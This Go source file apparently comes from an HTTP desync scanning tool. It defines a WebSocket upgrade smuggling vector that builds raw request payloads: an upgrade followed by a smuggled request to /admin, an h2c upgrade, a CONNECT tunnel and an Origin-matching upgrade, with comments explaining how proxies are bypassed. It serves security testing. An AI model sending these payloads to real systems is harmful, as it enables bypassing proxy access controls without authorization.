package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

// WSSmuggleVector tests WebSocket upgrade smuggling.
//
// The attack works when:
// 1. Frontend proxy validates Upgrade: websocket and forwards to backend
// 2. Backend rejects the upgrade (e.g., 401, 404) but proxy already
//    switched to tunnel mode based on the request headers alone
// 3. Proxy stops inspecting the connection — attacker sends raw HTTP
//    requests through the "tunnel" that bypass proxy access controls
//
// Also tests: WebSocket frames containing HTTP requests, and cross-protocol
// smuggling where the proxy treats the connection as WebSocket but the
// backend treats it as HTTP.
type WSSmuggleVector struct{}

func NewWSSmuggleVector() *WSSmuggleVector {
	return &WSSmuggleVector{}
}

func (v *WSSmuggleVector) Name() string {
	return "WS.Smuggle (WebSocket Upgrade Smuggling)"
}

func (v *WSSmuggleVector) Type() VectorType {
	return WSSmugg
}

func (v *WSSmuggleVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	return nil // requires raw client
}

func (v *WSSmuggleVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. Basic WebSocket upgrade to non-WebSocket endpoint
	// If proxy enters tunnel mode before checking backend response:
	{
		raw := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name: "ws-upgrade-basic",
			Data: []byte(raw),
			Description: "WebSocket upgrade to non-WS endpoint. If proxy enters tunnel mode " +
				"before backend rejects, subsequent raw requests bypass proxy inspection.",
			Technique: "ws-upgrade",
		})
	}

	// 2. WebSocket upgrade + immediate smuggled request
	// Send upgrade request followed immediately by a raw HTTP request
	{
		upgrade := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"\r\n", path, host)
		smuggled := fmt.Sprintf("GET /admin HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", host)
		raw := upgrade + smuggled
		payloads = append(payloads, RawPayload{
			Name: "ws-upgrade-then-smuggle",
			Data: []byte(raw),
			Description: "WebSocket upgrade immediately followed by smuggled HTTP request. " +
				"Proxy in tunnel mode forwards the smuggled request without inspection.",
			Technique: "ws-upgrade-smuggle",
		})
	}

	// 3. Fake 101 response confusion (H2 to H1 downgrade + WS)
	payloads = append(payloads, RawPayload{
		Name: "ws-fake-101",
		Description: "H2 request triggers WS upgrade, proxy synthesizes 101 response, " +
			"enters tunnel mode. Backend never actually upgraded — proxy/backend desync on connection state.",
		Technique: "ws-fake-upgrade",
	})

	// 4. Upgrade: h2c (HTTP/2 cleartext upgrade smuggling)
	{
		raw := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: h2c\r\n"+
			"HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\n"+
			"Connection: Upgrade, HTTP2-Settings\r\n"+
			"\r\n", path, host)
		payloads = append(payloads, RawPayload{
			Name:        "h2c-upgrade-smuggle",
			Data:        []byte(raw),
			Description: "h2c cleartext upgrade: proxy may forward upgrade, backend accepts, then attacker sends H2 frames that bypass proxy inspection.",
			Technique:   "h2c-upgrade",
		})
	}

	// 5. WebSocket with Origin validation bypass
	{
		raw := fmt.Sprintf("GET /ws HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"Origin: https://%s\r\n"+
			"\r\n", host, host)
		payloads = append(payloads, RawPayload{
			Name:        "ws-origin-bypass",
			Data:        []byte(raw),
			Description: "WebSocket upgrade with matching Origin header to bypass CORS-like checks, then smuggle through the tunnel.",
			Technique:   "ws-origin-bypass",
		})
	}

	// 6. CONNECT method smuggling (novel)
	{
		raw := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"\r\n", host, host)
		payloads = append(payloads, RawPayload{
			Name:        "connect-tunnel-smuggle",
			Data:        []byte(raw),
			Description: "HTTP CONNECT method: if proxy supports it, creates raw TCP tunnel. Any subsequent data bypasses HTTP inspection.",
			Technique:   "connect-tunnel",
		})
	}

	return payloads
}

func (v *WSSmuggleVector) Verify(resp *client.Response) bool {
	// 101 Switching Protocols indicates the tunnel was established
	return resp.StatusCode == 101 || resp.StatusCode == 200
}
